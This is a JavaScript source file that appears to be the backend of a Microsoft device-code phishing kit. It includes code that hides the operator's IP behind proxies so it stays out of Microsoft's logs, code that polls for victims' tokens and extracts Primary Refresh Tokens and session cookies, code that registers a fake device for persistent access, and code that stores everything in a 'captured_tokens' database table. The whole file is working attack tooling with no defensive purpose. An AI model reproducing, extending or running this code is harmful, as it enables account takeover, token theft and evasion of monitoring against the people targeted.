/**
 * devicecode.js
 *
 * Backend device code flow with proxy support and PRT extraction.
 *
 * Why this exists:
 * - All outbound calls go through microsoftclient (proxied), so the VPS IP
 *   never appears in Microsoft's logs.
 * - The device_code request and every subsequent token poll MUST use the same
 *   proxy — Microsoft binds the device_code to the IP that requested it. A
 *   random proxy per call would silently break the token exchange.
 * - The PRT is returned in the Set-Cookie header of the token response as
 *   `x-ms-RefreshTokenCredential`. The old code read only `response.data`
 *   and threw those headers away, so PRTs were never captured.
 */

const db = require('../database/connection');
const { encrypt, decrypt } = require('../utils/encrypt');
const config = require('../config/env');
const ms = require('./microsoftclient');
const crypto = require('crypto');
const forge = require('node-forge');

const TENANT = config.AZURE_TENANT || 'common';
const DRS_ENDPOINT = 'https://enterpriseregistration.windows.net/EnrollmentServer/device/';

/**
 * Generate a random device name like DESKTOP-ABCDEF.
 *
 * @returns {string}
 */
function generateDeviceName() {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let name = 'DESKTOP-';

  for (let i = 0; i < 8; i++) {
    name += chars[Math.floor(Math.random() * chars.length)];
  }

  return name;
}

/**
 * Generate an RSA key pair and PKCS#10 CSR using node-forge.
 *
 * @param {string} commonName
 * @returns {{ privateKeyPem: string, publicKeyPem: string, csrPem: string, csrDerBase64: string }}
 */
function generateKeyPairAndCsr(commonName) {
  const keys = forge.pki.rsa.generateKeyPair(2048);

  const privateKeyPem = forge.pki.privateKeyToPem(keys.privateKey);
  const publicKeyPem = forge.pki.publicKeyToPem(keys.publicKey);

  const csr = forge.pki.createCertificationRequest();
  csr.publicKey = keys.publicKey;
  csr.setSubject([{ name: 'commonName', value: commonName }]);
  csr.sign(keys.privateKey);

  const csrPem = forge.pki.certificationRequestToPem(csr);

  // Convert CSR to DER and base64 for DRS
  const csrDer = forge.asn1.toDer(forge.pki.certificationRequestToAsn1(csr)).getBytes();
  const csrDerBase64 = Buffer.from(csrDer, 'binary').toString('base64');

  return {
    privateKeyPem,
    publicKeyPem,
    csrPem,
    csrDerBase64,
  };
}

/**
 * Request a device code from Microsoft using the broker client ID and
 * the deviceRegistration scope.
 *
 * NOTE: The returned proxy must be passed to the next polling step.
 * Microsoft binds the flow to the requesting IP.
 *
 * @returns {Promise<object>}
 */
async function requestDeviceCode() {
  const { proxy, response } = await ms.post(
    `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/devicecode`,
    new URLSearchParams({
      client_id: config.AZURE_CLIENT_ID,
      scope: 'openid profile email offline_access urn:ms-drs:enterpriseregistration.windows.net/.default',
    }),
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      timeout: 15000,
      stickyProxy: true,
    }
  );

  return {
    device_code: response.data.device_code,
    user_code: response.data.user_code,
    verification_uri: response.data.verification_uri,
    expires_in: response.data.expires_in,
    interval: response.data.interval || 5,
    message: response.data.message,
    proxy,
  };
}

/**
 * Enroll a device through DRS using an access token from the broker flow.
 *
 * @param {string} accessToken
 * @param {string} deviceCodeId
 * @param {string} tenant
 * @param {object} proxy
 * @returns {Promise<{ deviceId, deviceCertificate, privateKeyPem, csrDerBase64, deviceName }>}
 */
async function enrollDevice(accessToken, deviceCodeId, tenant, proxy) {
  const deviceName = generateDeviceName();
  const { privateKeyPem, csrDerBase64 } = generateKeyPairAndCsr(deviceName);

  const targetDomain = tenant && tenant !== 'common' ? tenant : 'common';

  const enrollmentBody = {
    DeviceDisplayName: deviceName,
    DeviceOsType: 'Windows',
    DeviceOsVersion: '10.0.22631.3880',
    CertificateRequest: {
      Type: 'pkcs10',
      Data: csrDerBase64,
    },
    TargetDomain: targetDomain,
    DeviceType: 'RegisteredDevice',
  };

  // Tie enrollment to the specific auth flow when available
  if (deviceCodeId) {
    enrollmentBody.DeviceCodeId = deviceCodeId;
  }

  const response = await ms.post(
    DRS_ENDPOINT,
    JSON.stringify(enrollmentBody),
    {
      headers: {
        Authorization: `Bearer ${accessToken}`,
        'Content-Type': 'application/json',
        Accept: 'application/json',
        'User-Agent': 'Microsoft-Workplace-Join/1.0',
      },
      timeout: 30000,
      proxy,
      validateStatus: () => true,
    }
  );

  if (response.status !== 200) {
    const errorMsg =
      response.data?.error_description ||
      response.data?.Message ||
      JSON.stringify(response.data);

    throw new Error(`DRS enrollment failed (${response.status}): ${errorMsg}`);
  }

  const data = response.data;

  // DRS may return the certificate in multiple fields
  let deviceCertificate =
    data.Certificate ||
    data.certificate ||
    data.deviceCertificate ||
    data.x509Certificate;

  let deviceId = data.DeviceId || data.deviceId || data.device_id;

  if (!deviceCertificate) {
    throw new Error('DRS enrollment succeeded but no device certificate returned');
  }

  // Convert certificate to PEM format if needed
  if (!deviceCertificate.includes('-----BEGIN')) {
    deviceCertificate =
      '-----BEGIN CERTIFICATE-----\n' +
      deviceCertificate.match(/.{1,64}/g).join('\n') +
      '\n-----END CERTIFICATE-----';
  }

  return {
    deviceId,
    deviceCertificate,
    privateKeyPem,
    csrDerBase64,
    deviceName,
  };
}

/**
 * Build a client assertion JWT signed with the device private key.
 *
 * Used for RFC 7521 / RFC 7523 device-bound token renewal.
 *
 * @param {string} privateKeyPem
 * @param {string} deviceId
 * @param {string} audience
 * @returns {string}
 */
function buildClientAssertion(privateKeyPem, deviceId, audience) {
  const privateKey = forge.pki.privateKeyFromPem(privateKeyPem);

  const header = { alg: 'RS256', typ: 'JWT' };
  const now = Math.floor(Date.now() / 1000);

  const payload = {
    aud: audience,
    iss: deviceId,
    sub: deviceId,
    jti: crypto.randomUUID(),
    exp: now + 3600,
    iat: now,
  };

  const headerB64 = Buffer.from(JSON.stringify(header)).toString('base64url');
  const payloadB64 = Buffer.from(JSON.stringify(payload)).toString('base64url');

  const signingInput = `${headerB64}.${payloadB64}`;

  const md = forge.md.sha256.create();
  md.update(signingInput, 'utf8');

  const signature = privateKey.sign(md);
  const signatureB64 = Buffer.from(signature, 'binary').toString('base64url');

  return `${signingInput}.${signatureB64}`;
}

/**
 * Renew tokens via device certificate using the client_assertion flow.
 *
 * @param {string} privateKeyPem
 * @param {string} deviceId
 * @param {string} tenant
 * @param {string} clientId
 * @param {string} scope
 * @param {object} proxy
 * @returns {Promise<object>}
 */
async function renewTokenWithDeviceCert(
  privateKeyPem,
  deviceId,
  tenant,
  clientId,
  scope,
  proxy
) {
  const tokenEndpoint = `https://login.microsoftonline.com/${tenant}/oauth2/v2.0/token`;
  const audience = tokenEndpoint;

  const clientAssertion = buildClientAssertion(
    privateKeyPem,
    deviceId,
    audience
  );

  const params = new URLSearchParams({
    grant_type: 'client_credentials',
    client_id: clientId,
    client_assertion_type:
      'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
    client_assertion: clientAssertion,
    scope: scope,
  });

  const response = await ms.post(
    tokenEndpoint,
    params,
    {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      timeout: 30000,
      proxy,
      validateStatus: () => true,
    }
  );

  if (response.status !== 200) {
    throw new Error(
      `Device cert token renewal failed (${response.status}): ${JSON.stringify(response.data)}`
    );
  }

  return response.data;
}



/**
 * Poll for tokens, extracting the PRT from Set-Cookie headers.
 *
 * @param {string} deviceCode
 * @param {number} linkId
 * @param {number} userId
 * @param {number} initialInterval
 * @param {object} proxy  - the SAME proxy returned by requestDeviceCode
 * @returns {object} { success, email, access_token, refresh_token, prt,
 *                     session_key_jwe, device_tenant_id, cookies, proxy }
 */
async function pollForTokens(deviceCode, linkId, userId, initialInterval, proxy) {
    const maxAttempts = 60;
    let attempts = 0;
    let interval = initialInterval || 5;

    while (attempts < maxAttempts) {
        attempts++;
        await new Promise(resolve => setTimeout(resolve, interval * 1000));

        let response;
        try {
            response = await ms.post(
                `https://login.microsoftonline.com/${TENANT}/oauth2/v2.0/token`,
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: config.AZURE_CLIENT_ID,
                    device_code: deviceCode,
                }),
                {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    timeout: 15000,
                    proxy,
                }
            );
        } catch (err) {
            const errorCode = err.response?.data?.error || '';

            if (errorCode === 'authorization_pending') continue;
            if (errorCode === 'slow_down') { interval += 5; continue; }
            if (errorCode === 'authorization_declined') {
                return { success: false, error: 'User declined authorization', proxy };
            }
            if (errorCode === 'expired_token') {
                return { success: false, error: 'Code expired', proxy };
            }
            if (attempts >= maxAttempts) {
                return { success: false, error: 'Timeout waiting for user', proxy };
            }
            continue;
        }

        // Tokens received — extract cookies and persist
        const tokenData = response.data;
        const setCookieHeaders = response.headers['set-cookie'] || [];
        const parsedCookies = ms.parseSetCookieCookies(setCookieHeaders);

        const { access_token, refresh_token, id_token } = tokenData;

        let email = null;
        if (id_token) {
            try {
                const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
                email = payload.email || payload.upn || payload.preferred_username || null;
            } catch (e) { /* ignore decode errors */ }
        }

        // Extract PRT from Set-Cookie headers.
        // x-ms-RefreshTokenCredential is the raw PRT — exactly what silent
        // consent expects as the x-ms-RefreshTokenCredential header value.
        // ESTSAUTH carries the session_key JWE.
        const prt = parsedCookies['x-ms-RefreshTokenCredential'] || null;
        const sessionKeyJwe = parsedCookies['ESTSAUTH'] || null;
        const deviceTenantId = parsedCookies['X-Device-Tenant-Id'] || null;

        // Try to parse the id_token's client_info claim for device_tenant_id
        let deviceTenantIdClaim = deviceTenantId;
        if (id_token && !deviceTenantIdClaim) {
            try {
                const payload = JSON.parse(Buffer.from(id_token.split('.')[1], 'base64').toString());
                if (payload.client_info) {
                    const info = JSON.parse(Buffer.from(payload.client_info, 'base64').toString());
                    deviceTenantIdClaim = info.did || null;
                }
            } catch (e) { /* ignore */ }
        }

        // Persist all captured data
        const clientIdUsed = config.AZURE_CLIENT_ID;
        const tenant = TENANT;

        // Broker flow device enrollment
        let deviceId = null;
        let deviceEnrolled = false;
        let enrollmentTime = null;
        let deviceCertificateEncrypted = null;
        let encryptedPrivateKey = null;

        if (access_token) {
            try {
                const accessPayload = JSON.parse(Buffer.from(access_token.split('.')[1], 'base64').toString());
                deviceId = accessPayload['device_code_id'] || accessPayload['xms_device_id'] || accessPayload['oid'] || null;
            } catch (e) {
                deviceId = null;
            }
        }

        if (deviceId) {
            try {
                const enrollmentResult = await enrollDevice(access_token, deviceId, TENANT);
                deviceEnrolled = true;
                enrollmentTime = new Date();

                const { deviceCertificate, privateKeyPem } = enrollmentResult;
                deviceCertificateEncrypted = deviceCertificate ? encrypt(deviceCertificate) : null;
                encryptedPrivateKey = privateKeyPem ? encrypt(privateKeyPem) : null;

                console.log(`[devicecode] Device enrolled: ${enrollmentResult.deviceName} (${deviceId})`);
            } catch (enrollErr) {
                console.error('[devicecode] Device enrollment failed:', enrollErr.message);
                deviceEnrolled = false;
            }
        }

        await db.query(
            `INSERT INTO captured_tokens
             (user_id, link_id, email, token_type, access_token_encrypted,
              refresh_token_encrypted, id_token_encrypted,
              prt, session_key_jwe, device_tenant_id,
              ip_address, user_agent, expiration, tenant, template_type, client_id,
              account_type,
              device_id, device_certificate_encrypted, encrypted_private_key,
              device_enrolled, enrollment_time)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
            [
                userId, linkId, email, 'token',
                access_token ? encrypt(access_token) : null,
                refresh_token ? encrypt(refresh_token) : null,
                id_token ? encrypt(id_token) : null,
                prt ? encrypt(prt) : null,
                sessionKeyJwe ? encrypt(sessionKeyJwe) : null,
                deviceTenantIdClaim,
                '0.0.0.0',
                'Device Code Flow',
                tenant, 'office', clientIdUsed,
                tenant === 'common' ? 'unknown' : 'work_school',
                deviceId,
                deviceCertificateEncrypted,
                encryptedPrivateKey,
                deviceEnrolled ? 1 : 0,
                enrollmentTime,
            ]
        );

        return {
            success: true,
            email,
            access_token,
            refresh_token,
            id_token,
            prt,
            session_key_jwe: sessionKeyJwe,
            device_tenant_id: deviceTenantIdClaim,
            cookies: parsedCookies,
            proxy,
        };
    }

    return { success: false, error: 'Timeout', proxy };
}



module.exports = {
  requestDeviceCode,
  pollForTokens,
  generateDeviceName,
  generateKeyPairAndCsr,
  enrollDevice,
  buildClientAssertion,
  renewTokenWithDeviceCert,
};
